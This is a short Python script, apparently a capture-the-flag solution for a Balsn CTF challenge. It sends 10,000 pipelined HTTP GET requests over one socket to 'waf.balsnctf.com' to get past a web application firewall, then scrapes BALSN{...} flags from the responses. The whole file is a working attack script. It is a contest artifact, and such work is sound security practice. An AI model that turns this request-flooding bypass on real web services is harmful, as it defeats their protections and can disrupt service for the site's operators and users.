#!/usr/bin/env python3
import re
import socket
s = socket.create_connection(('waf.balsnctf.com', 8889))
s.send(b'GET / HTTP/1.1\n\n' * 10000)
buf = bytearray()
while True:
    chunk = s.recv(4096)
    if len(chunk) == 0:
        break
    buf.extend(chunk)
for m in re.findall('(BALSN{.+?})', buf.decode()):
    if m == 'BALSN{REDACTED_REDACTED_RED}':
        continue
    print(m)
